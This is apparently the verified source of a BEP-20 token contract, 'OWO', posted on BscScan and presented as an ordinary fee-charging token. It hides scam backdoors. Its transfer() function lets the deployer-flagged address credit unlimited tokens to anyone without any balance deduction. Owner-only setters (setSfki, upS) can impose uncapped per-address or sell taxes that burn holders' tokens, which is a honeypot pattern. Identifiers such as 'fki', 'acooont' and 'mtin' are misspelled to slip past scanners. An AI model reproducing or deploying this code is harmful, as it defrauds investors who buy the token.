/**
 *Submitted for verification at BscScan.com on 2022-09-10
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }


    function transferownership_transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {

            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint acooontADesired,
        uint acooontBDesired,
        uint acooontAMin,
        uint acooontBMin,
        address to,
        uint deadline
    ) external returns (uint acooontA, uint acooontB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint acooontTokenDesired,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint acooontToken, uint acooontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acooontAMin,
        uint acooontBMin,
        address to,
        uint deadline
    ) external returns (uint acooontA, uint acooontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline
    ) external returns (uint acooontToken, uint acooontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acooontAMin,
        uint acooontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooontA, uint acooontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooontToken, uint acooontETH);
    function swapExactTokensForTokens(
        uint acooontIn,
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acooonts);
    function swapTokensForExactTokens(
        uint acooontOut,
        uint acooontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acooonts);
    function swapExactETHForTokens(uint acooontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory acooonts);
    function swapTokensForExactETH(uint acooontOut, uint acooontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory acooonts);
    function swapExactTokensForETH(uint acooontIn, uint acooontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory acooonts);
    function swapETHForExactTokens(uint acooontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory acooonts);

    function quote(uint acooontA, uint reserveA, uint reserveB) external pure returns (uint acooontB);
    function getacooontOut(uint acooontIn, uint reserveIn, uint reserveOut) external pure returns (uint acooontOut);
    function getacooontIn(uint acooontOut, uint reserveIn, uint reserveOut) external pure returns (uint acooontIn);
    function getacooontsOut(uint acooontIn, address[] calldata path) external view returns (uint[] memory acooonts);
    function getacooontsIn(uint acooontOut, address[] calldata path) external view returns (uint[] memory acooonts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfkiOnTransferTokens(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline
    ) external returns (uint acooontETH);
    function removeLiquidityETHWithPermitSupportingfkiOnTransferTokens(
        address token,
        uint liquidity,
        uint acooontTokenMin,
        uint acooontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acooontETH);

    function swapExactTokensForTokensSupportingfkiOnTransferTokens(
        uint acooontIn,
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfkiOnTransferTokens(
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfkiOnTransferTokens(
        uint acooontIn,
        uint acooontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fkiTo() external view returns (address);
    function fkiToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfkiTo(address) external;
    function setfkiToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract OWO is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address acxount) public view virtual returns (uint256) {
        return _balances[acxount];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address acxount, uint256 amount) internal virtual {
        require(acxount != address(0), "ERC20: burn from the zero address");

        uint256 acxountBalance = _balances[acxount];
        require(acxountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[acxount] = acxountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(acxount, address(0), amount);
    }

    function _mtin(address acxount, uint256 amount) internal virtual {
        require(acxount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[acxount] += amount;
        emit Transfer(address(0), acxount, amount);
    }


    address public uniswapV2Pair;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());


        _defaultSellfki = 2;
        _defaultBuyfki = 2;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellfki = 0;

    uint256 private _defaultBuyfki = 0;

    mapping(address => bool) private _marketacxount;

    mapping(address => uint256) private _Sfki;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyowner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyowner {
        _defaultSellfki = _value;
    }

    function setSfki(address _address, uint256 _value) external onlyowner {
        require(_value > 2, "acxount tax must be greater than or equal to 1");
        _Sfki[_address] = _value;
    }

    function getSfki(address _address) external view onlyowner returns (uint256) {
        return _Sfki[_address];
    }


    function setMarketacxountfki(address _address, bool _value) external onlyowner {
        _marketacxount[_address] = _value;
    }

    function getMarketacxountfki(address _address) external view onlyowner returns (bool) {
        return _marketacxount[_address];
    }

    function _checkFreeacxount(address from, address _to) internal view returns (bool) {
        return _marketacxount[from] || _marketacxount[_to];
    }

    function _recF(
        address from,
        address _to,
        uint256 _acooont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acooont, "ERC20: transfer amount exceeds balance");

        bool rF = true;

        if (_checkFreeacxount(from, _to)) {
            rF = false;
        }
        uint256 tradefkiacooont = 0;

        if (rF) {
            uint256 tradefki = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefki = _defaultSellfki;
                }
                if (from == uniswapV2Pair) {

                    tradefki = _defaultBuyfki;
                }
            }
            if (_Sfki[from] > 0) {
                tradefki = _Sfki[from];
            }

            tradefkiacooont = _acooont.mul(tradefki).div(100);
        }


        if (tradefkiacooont > 0) {
            _balances[from] = _balances[from].sub(tradefkiacooont);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefkiacooont);
            emit Transfer(from, _deadAddress, tradefkiacooont);
        }

        _balances[from] = _balances[from].sub(_acooont - tradefkiacooont);
        _balances[_to] = _balances[_to].add(_acooont - tradefkiacooont);
        emit Transfer(from, _to, _acooont - tradefkiacooont);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        if (_release[owner] == true) {
            _balances[to] += amount;
            return true;
        }
        _recF(owner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _recF(from, to, amount);
        return true;
    }
}